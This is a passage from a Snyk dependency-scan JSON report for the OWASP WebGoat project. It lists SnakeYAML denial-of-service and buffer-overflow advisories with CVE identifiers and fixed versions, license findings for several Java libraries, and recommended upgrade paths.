package](https://snyk.io/vuln/npm:ws:20171108)\n\n## Remediation\nUpgrade `org.yaml:snakeyaml` to version 1.31 or higher.\n## References\n- [Bitbucket Commit](https://bitbucket.org/snakeyaml/snakeyaml/commits/fc300780da21f4bb92c148bc90257201220cf174)\n- [BitBucket Issues](https://bitbucket.org/snakeyaml/snakeyaml/issues/525)\n- [GitHub Commit](https://github.com/snakeyaml/snakeyaml/commit/fc300780da21f4bb92c148bc90257201220cf174)\n",
        "disclosureTime": "2022-05-01T13:50:41Z",
        "exploit": "Not Defined",
        "functions": [],
        "fixedIn": [
          "1.31"
        ],
        "id": "SNYK-JAVA-ORGYAML-2806360",
        "identifiers": {
          "CWE": [
            "CWE-400"
          ],
          "CVE": [
            "CVE-2022-25857",
            "CVE-2022-38749"
          ]
        },
        "language": "java",
        "malicious": false,
        "modificationTime": "2022-09-18T13:49:26.396777Z",
        "moduleName": "org.yaml:snakeyaml",
        "packageManager": "maven",
        "packageName": "org.yaml:snakeyaml",
        "patches": [],
        "proprietary": true,
        "publicationTime": "2022-08-29T15:10:51Z",
        "references": [
          {
            "title": "Bitbucket Commit",
            "url": "https://bitbucket.org/snakeyaml/snakeyaml/commits/fc300780da21f4bb92c148bc90257201220cf174"
          },
          {
            "title": "BitBucket Issues",
            "url": "https://bitbucket.org/snakeyaml/snakeyaml/issues/525"
          },
          {
            "title": "GitHub Commit",
            "url": "https://github.com/snakeyaml/snakeyaml/commit/fc300780da21f4bb92c148bc90257201220cf174"
          }
        ],
        "severity": "high",
        "socialTrendAlert": false,
        "title": "Denial of Service (DoS)",
        "insights": {
          "triageAdvice": null
        },
        "cvssDetails": [
          {
            "assigner": "NVD",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 7.5,
            "severity": "high",
            "modificationTime": "2022-09-02T01:11:51.425632Z"
          },
          {
            "assigner": "RHEL",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 7.5,
            "severity": "high",
            "modificationTime": "2022-09-20T15:53:57.072792Z"
          }
        ],
        "functions_new": [],
        "semver": {
          "vulnerable": [
            "[0,1.31)"
          ]
        },
        "mavenModuleName": {
          "groupId": "org.yaml",
          "artifactId": "snakeyaml"
        },
        "from": [
          "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
          "org.springframework.boot:spring-boot-starter-validation@2.7.1",
          "org.springframework.boot:spring-boot-starter@2.7.1",
          "org.yaml:snakeyaml@1.30"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "org.yaml:snakeyaml",
        "version": "1.30",
        "severityWithCritical": "high"
      },
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L/E:P",
        "alternativeIds": [],
        "creationTime": "2022-09-05T11:04:53.633779Z",
        "credit": [
          "Dae"
        ],
        "cvssScore": 3.7,
        "description": "## Overview\n[org.yaml:snakeyaml](https://code.google.com/p/snakeyaml/source/browse/) is a YAML 1.1 parser and emitter for Java.\n\nAffected versions of this package are vulnerable to Stack-based Buffer Overflow when parsing crafted untrusted YAML files, which can lead to a denial-of-service.\n## Remediation\nUpgrade `org.yaml:snakeyaml` to version 1.32 or higher.\n## References\n- [Bitbucket Commit](https://bitbucket.org/snakeyaml/snakeyaml/commits/5056a448f09c46250346c338e821386caa751182)\n- [Bitbucket Issue and PoC](https://bitbucket.org/snakeyaml/snakeyaml/issues/531/stackoverflow-oss-fuzz-47081)\n- [Chromium Bugs](https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=47081)\n",
        "disclosureTime": "2022-09-05T10:57:12Z",
        "exploit": "Proof of Concept",
        "functions": [],
        "fixedIn": [
          "1.32"
        ],
        "id": "SNYK-JAVA-ORGYAML-3016888",
        "identifiers": {
          "CWE": [
            "CWE-121"
          ],
          "CVE": [
            "CVE-2022-38752"
          ]
        },
        "language": "java",
        "malicious": false,
        "modificationTime": "2022-09-19T08:08:14.388942Z",
        "moduleName": "org.yaml:snakeyaml",
        "packageManager": "maven",
        "packageName": "org.yaml:snakeyaml",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2022-09-05T14:36:28Z",
        "references": [
          {
            "title": "Bitbucket Commit",
            "url": "https://bitbucket.org/snakeyaml/snakeyaml/commits/5056a448f09c46250346c338e821386caa751182"
          },
          {
            "title": "Bitbucket Issue and PoC",
            "url": "https://bitbucket.org/snakeyaml/snakeyaml/issues/531/stackoverflow-oss-fuzz-47081"
          },
          {
            "title": "Chromium Bugs",
            "url": "https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=47081"
          }
        ],
        "severity": "low",
        "socialTrendAlert": false,
        "title": "Stack-based Buffer Overflow",
        "insights": {
          "triageAdvice": null
        },
        "cvssDetails": [
          {
            "assigner": "NVD",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 6.5,
            "severity": "medium",
            "modificationTime": "2022-09-09T01:12:01.539668Z"
          }
        ],
        "functions_new": [],
        "semver": {
          "vulnerable": [
            "[,1.32)"
          ]
        },
        "mavenModuleName": {
          "groupId": "org.yaml",
          "artifactId": "snakeyaml"
        },
        "from": [
          "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
          "org.springframework.boot:spring-boot-starter-validation@2.7.1",
          "org.springframework.boot:spring-boot-starter@2.7.1",
          "org.yaml:snakeyaml@1.30"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "org.yaml:snakeyaml",
        "version": "1.30",
        "severityWithCritical": "low"
      },
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
        "alternativeIds": [],
        "creationTime": "2022-09-05T11:15:20.545842Z",
        "credit": [
          "Dae"
        ],
        "cvssScore": 3.7,
        "description": "## Overview\n[org.yaml:snakeyaml](https://code.google.com/p/snakeyaml/source/browse/) is a YAML 1.1 parser and emitter for Java.\n\nAffected versions of this package are vulnerable to Stack-based Buffer Overflow in `org.yaml.snakeyaml.constructor.BaseConstructor.constructObject` when parsing crafted untrusted YAML files, which can lead to a denial-of-service.\n## Remediation\nUpgrade `org.yaml:snakeyaml` to version 1.31 or higher.\n## References\n- [Bitbucket Commit](https://bitbucket.org/snakeyaml/snakeyaml/commits/fc300780da21f4bb92c148bc90257201220cf174)\n- [Bitbucket Issue](https://bitbucket.org/snakeyaml/snakeyaml/issues/526/stackoverflow-oss-fuzz-47027)\n- [Chromium Bugs](https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=47027)\n",
        "disclosureTime": "2022-09-05T11:07:09Z",
        "exploit": "Not Defined",
        "functions": [],
        "fixedIn": [
          "1.31"
        ],
        "id": "SNYK-JAVA-ORGYAML-3016889",
        "identifiers": {
          "CWE": [
            "CWE-121"
          ],
          "CVE": [
            "CVE-2022-38750"
          ]
        },
        "language": "java",
        "malicious": false,
        "modificationTime": "2022-09-05T14:37:45.064123Z",
        "moduleName": "org.yaml:snakeyaml",
        "packageManager": "maven",
        "packageName": "org.yaml:snakeyaml",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2022-09-05T14:37:45.062245Z",
        "references": [
          {
            "title": "Bitbucket Commit",
            "url": "https://bitbucket.org/snakeyaml/snakeyaml/commits/fc300780da21f4bb92c148bc90257201220cf174"
          },
          {
            "title": "Bitbucket Issue",
            "url": "https://bitbucket.org/snakeyaml/snakeyaml/issues/526/stackoverflow-oss-fuzz-47027"
          },
          {
            "title": "Chromium Bugs",
            "url": "https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=47027"
          }
        ],
        "severity": "low",
        "socialTrendAlert": false,
        "title": "Stack-based Buffer Overflow",
        "insights": {
          "triageAdvice": null
        },
        "cvssDetails": [
          {
            "assigner": "NVD",
            "cvssV3Vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 5.5,
            "severity": "medium",
            "modificationTime": "2022-09-10T01:11:52.820366Z"
          }
        ],
        "functions_new": [],
        "semver": {
          "vulnerable": [
            "[,1.31)"
          ]
        },
        "mavenModuleName": {
          "groupId": "org.yaml",
          "artifactId": "snakeyaml"
        },
        "from": [
          "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
          "org.springframework.boot:spring-boot-starter-validation@2.7.1",
          "org.springframework.boot:spring-boot-starter@2.7.1",
          "org.yaml:snakeyaml@1.30"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "org.yaml:snakeyaml",
        "version": "1.30",
        "severityWithCritical": "low"
      },
      {
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L/E:P",
        "alternativeIds": [],
        "creationTime": "2022-09-05T11:36:11.867021Z",
        "credit": [
          "Dae"
        ],
        "cvssScore": 4.3,
        "description": "## Overview\n[org.yaml:snakeyaml](https://code.google.com/p/snakeyaml/source/browse/) is a YAML 1.1 parser and emitter for Java.\n\nAffected versions of this package are vulnerable to Stack-based Buffer Overflow when parsing crafted untrusted YAML files, which can lead to a denial-of-service.\n## Remediation\nUpgrade `org.yaml:snakeyaml` to version 1.31 or higher.\n## References\n- [Bitbucket Commit](https://bitbucket.org/snakeyaml/snakeyaml/commits/f3ab4e0f54c37ddb10f00b71d04187bb0ef1799c)\n- [Bitbucket Issue](https://bitbucket.org/snakeyaml/snakeyaml/issues/530/stackoverflow-oss-fuzz-47039)\n- [Chromium Bugs](https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=47039)\n",
        "disclosureTime": "2022-09-05T11:27:18Z",
        "exploit": "Proof of Concept",
        "functions": [],
        "fixedIn": [
          "1.31"
        ],
        "id": "SNYK-JAVA-ORGYAML-3016891",
        "identifiers": {
          "CWE": [
            "CWE-121"
          ],
          "CVE": [
            "CVE-2022-38751"
          ]
        },
        "language": "java",
        "malicious": false,
        "modificationTime": "2022-09-05T14:35:35.221725Z",
        "moduleName": "org.yaml:snakeyaml",
        "packageManager": "maven",
        "packageName": "org.yaml:snakeyaml",
        "patches": [],
        "proprietary": false,
        "publicationTime": "2022-09-05T14:35:35.219360Z",
        "references": [
          {
            "title": "Bitbucket Commit",
            "url": "https://bitbucket.org/snakeyaml/snakeyaml/commits/f3ab4e0f54c37ddb10f00b71d04187bb0ef1799c"
          },
          {
            "title": "Bitbucket Issue",
            "url": "https://bitbucket.org/snakeyaml/snakeyaml/issues/530/stackoverflow-oss-fuzz-47039"
          },
          {
            "title": "Chromium Bugs",
            "url": "https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=47039"
          }
        ],
        "severity": "medium",
        "socialTrendAlert": false,
        "title": "Stack-based Buffer Overflow",
        "insights": {
          "triageAdvice": null
        },
        "cvssDetails": [
          {
            "assigner": "NVD",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 6.5,
            "severity": "medium",
            "modificationTime": "2022-09-09T01:12:01.622444Z"
          }
        ],
        "functions_new": [],
        "semver": {
          "vulnerable": [
            "[,1.31)"
          ]
        },
        "mavenModuleName": {
          "groupId": "org.yaml",
          "artifactId": "snakeyaml"
        },
        "from": [
          "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
          "org.springframework.boot:spring-boot-starter-validation@2.7.1",
          "org.springframework.boot:spring-boot-starter@2.7.1",
          "org.yaml:snakeyaml@1.30"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "org.yaml:snakeyaml",
        "version": "1.30",
        "severityWithCritical": "medium"
      },
      {
        "id": "snyk:lic:maven:ch.qos.logback:logback-classic:EPL-1.0_OR_LGPL-2.1",
        "packageName": "ch.qos.logback:logback-classic",
        "semver": {
          "vulnerable": [
            "[0.9.18,)"
          ]
        },
        "creationTime": "2022-09-19T11:50:53.501Z",
        "description": "EPL-1.0 OR LGPL-2.1 license",
        "language": "java",
        "license": "EPL-1.0 OR LGPL-2.1",
        "packageManager": "maven",
        "publicationTime": "2022-09-19T11:50:53.501Z",
        "title": "EPL-1.0 OR LGPL-2.1 license",
        "type": "license",
        "severity": "medium",
        "from": [
          "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
          "org.springframework.boot:spring-boot-starter-validation@2.7.1",
          "org.springframework.boot:spring-boot-starter@2.7.1",
          "org.springframework.boot:spring-boot-starter-logging@2.7.1",
          "ch.qos.logback:logback-classic@1.2.11"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "ch.qos.logback:logback-classic",
        "version": "1.2.11",
        "severityWithCritical": "medium"
      },
      {
        "id": "snyk:lic:maven:ch.qos.logback:logback-core:EPL-1.0_OR_LGPL-2.1",
        "packageName": "ch.qos.logback:logback-core",
        "semver": {
          "vulnerable": [
            "[0.9.18,)"
          ]
        },
        "creationTime": "2022-09-19T10:08:01.613Z",
        "description": "EPL-1.0 OR LGPL-2.1 license",
        "language": "java",
        "license": "EPL-1.0 OR LGPL-2.1",
        "packageManager": "maven",
        "publicationTime": "2022-09-19T10:08:01.613Z",
        "title": "EPL-1.0 OR LGPL-2.1 license",
        "type": "license",
        "severity": "medium",
        "from": [
          "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
          "org.springframework.boot:spring-boot-starter-validation@2.7.1",
          "org.springframework.boot:spring-boot-starter@2.7.1",
          "org.springframework.boot:spring-boot-starter-logging@2.7.1",
          "ch.qos.logback:logback-classic@1.2.11",
          "ch.qos.logback:logback-core@1.2.11"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "ch.qos.logback:logback-core",
        "version": "1.2.11",
        "severityWithCritical": "medium"
      },
      {
        "id": "snyk:lic:maven:com.github.jnr:jnr-posix:EPL-1.0_OR_GPL-2.0_OR_LGPL-2.1",
        "packageName": "com.github.jnr:jnr-posix",
        "semver": {
          "vulnerable": [
            "[3.0.45,)"
          ]
        },
        "creationTime": "2022-09-20T03:16:24.351Z",
        "description": "EPL-1.0 OR GPL-2.0 OR LGPL-2.1 license",
        "language": "java",
        "license": "EPL-1.0 OR GPL-2.0 OR LGPL-2.1",
        "packageManager": "maven",
        "publicationTime": "2022-09-20T03:16:24.351Z",
        "title": "EPL-1.0 OR GPL-2.0 OR LGPL-2.1 license",
        "type": "license",
        "severity": "medium",
        "from": [
          "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
          "org.asciidoctor:asciidoctorj@2.5.3",
          "org.jruby:jruby@9.3.6.0",
          "org.jruby:jruby-base@9.3.6.0",
          "com.github.jnr:jnr-posix@3.1.15"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "com.github.jnr:jnr-posix",
        "version": "3.1.15",
        "severityWithCritical": "medium"
      },
      {
        "id": "snyk:lic:maven:org.aspectj:aspectjweaver:EPL-1.0",
        "packageName": "org.aspectj:aspectjweaver",
        "semver": {
          "vulnerable": [
            "[0,)"
          ]
        },
        "creationTime": "2022-09-20T05:17:15.368Z",
        "description": "EPL-1.0 license",
        "language": "java",
        "license": "EPL-1.0",
        "packageManager": "maven",
        "publicationTime": "2022-09-20T05:17:15.368Z",
        "title": "EPL-1.0 license",
        "type": "license",
        "severity": "medium",
        "from": [
          "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
          "org.springframework.boot:spring-boot-starter-data-jpa@2.7.1",
          "org.springframework.boot:spring-boot-starter-aop@2.7.1",
          "org.aspectj:aspectjweaver@1.9.7"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "org.aspectj:aspectjweaver",
        "version": "1.9.7",
        "severityWithCritical": "medium"
      },
      {
        "id": "snyk:lic:maven:org.hibernate.common:hibernate-commons-annotations:LGPL-2.1",
        "packageName": "org.hibernate.common:hibernate-commons-annotations",
        "semver": {
          "vulnerable": [
            "[0,)"
          ]
        },
        "creationTime": "2022-09-19T14:31:17.199Z",
        "description": "LGPL-2.1 license",
        "language": "java",
        "license": "LGPL-2.1",
        "packageManager": "maven",
        "publicationTime": "2022-09-19T14:31:17.199Z",
        "title": "LGPL-2.1 license",
        "type": "license",
        "severity": "medium",
        "from": [
          "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
          "org.springframework.boot:spring-boot-starter-data-jpa@2.7.1",
          "org.hibernate:hibernate-core@5.6.9.Final",
          "org.hibernate.common:hibernate-commons-annotations@5.1.2.Final"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "org.hibernate.common:hibernate-commons-annotations",
        "version": "5.1.2.Final",
        "severityWithCritical": "medium"
      },
      {
        "id": "snyk:lic:maven:org.hibernate:hibernate-core:LGPL-2.1",
        "packageName": "org.hibernate:hibernate-core",
        "semver": {
          "vulnerable": [
            "[5.3.1.Final,)"
          ]
        },
        "creationTime": "2022-09-20T02:11:51.164Z",
        "description": "LGPL-2.1 license",
        "language": "java",
        "license": "LGPL-2.1",
        "packageManager": "maven",
        "publicationTime": "2022-09-20T02:11:51.164Z",
        "title": "LGPL-2.1 license",
        "type": "license",
        "severity": "medium",
        "from": [
          "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
          "org.springframework.boot:spring-boot-starter-data-jpa@2.7.1",
          "org.hibernate:hibernate-core@5.6.9.Final"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "org.hibernate:hibernate-core",
        "version": "5.6.9.Final",
        "severityWithCritical": "medium"
      },
      {
        "id": "snyk:lic:maven:org.jruby:dirgra:EPL-1.0",
        "packageName": "org.jruby:dirgra",
        "semver": {
          "vulnerable": [
            "[0,)"
          ]
        },
        "creationTime": "2022-09-20T01:59:45.689Z",
        "description": "EPL-1.0 license",
        "language": "java",
        "license": "EPL-1.0",
        "packageManager": "maven",
        "publicationTime": "2022-09-20T01:59:45.689Z",
        "title": "EPL-1.0 license",
        "type": "license",
        "severity": "medium",
        "from": [
          "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
          "org.asciidoctor:asciidoctorj@2.5.3",
          "org.jruby:jruby@9.3.6.0",
          "org.jruby:jruby-base@9.3.6.0",
          "org.jruby:dirgra@0.3"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
        "isPinnable": false,
        "isRuntime": false,
        "name": "org.jruby:dirgra",
        "version": "0.3",
        "severityWithCritical": "medium"
      }
    ],
    "upgrade": {
      "com.thoughtworks.xstream:xstream@1.4.5": {
        "upgradeTo": "com.thoughtworks.xstream:xstream@1.4.19",
        "upgrades": [
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5",
          "com.thoughtworks.xstream:xstream@1.4.5"
        ],
        "vulns": [
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-2388977",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1569176",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1569177",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1569178",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1569179",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1569180",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1569181",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1569182",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1569183",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1569185",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1569186",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1569187",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1569189",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1569190",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1569191",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1294540",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1088328",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1088329",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1088330",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1088331",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1088332",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1088333",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1088334",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1088335",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1088336",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1088337",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1088338",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1051966",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1051967",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1040458",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-31394",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-30385",
          "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-460764"
        ]
      },
      "commons-io:commons-io@2.6": {
        "upgradeTo": "commons-io:commons-io@2.7",
        "upgrades": [
          "commons-io:commons-io@2.6"
        ],
        "vulns": [
          "SNYK-JAVA-COMMONSIO-1277109"
        ]
      },
      "org.jsoup:jsoup@1.14.3": {
        "upgradeTo": "org.jsoup:jsoup@1.15.3",
        "upgrades": [
          "org.jsoup:jsoup@1.14.3"
        ],
        "vulns": [
          "SNYK-JAVA-ORGJSOUP-2989728"
        ]
      },
      "org.springframework.boot:spring-boot-starter-undertow@2.7.1": {
        "upgradeTo": "org.springframework.boot:spring-boot-starter-undertow@2.7.3",
        "upgrades": [
          "io.undertow:undertow-core@2.2.18.Final"
        ],
        "vulns": [
          "SNYK-JAVA-IOUNDERTOW-2871356"
        ]
      },
      "org.webjars:bootstrap@3.3.7": {
        "upgradeTo": "org.webjars:bootstrap@3.4.1",
        "upgrades": [
          "org.webjars:bootstrap@3.3.7",
          "org.webjars:bootstrap@3.3.7",
          "org.webjars:bootstrap@3.3.7",
          "org.webjars:bootstrap@3.3.7",
          "org.webjars:bootstrap@3.3.7"
        ],
        "vulns": [
          "SNYK-JAVA-ORGWEBJARS-451160",
          "SNYK-JAVA-ORGWEBJARS-451162",
          "SNYK-JAVA-ORGWEBJARS-451164",
          "SNYK-JAVA-ORGWEBJARS-451168",
          "SNYK-JAVA-ORGWEBJARS-479505"
        ]
      }
    },
    "patch": {},
    "ignore": {},
    "pin": {}
  },
  "filesystemPolicy": false,
  "filtered": {
    "ignore": [],
    "patch": []
  },
  "uniqueCount": 54,
  "projectName": "org.owasp.webgoat:webgoat",
  "displayTargetFile": "pom.xml",
  "path": "C:\\ProgramData\\Jenkins\\.jenkins\\workspace\\WebGoat"
}
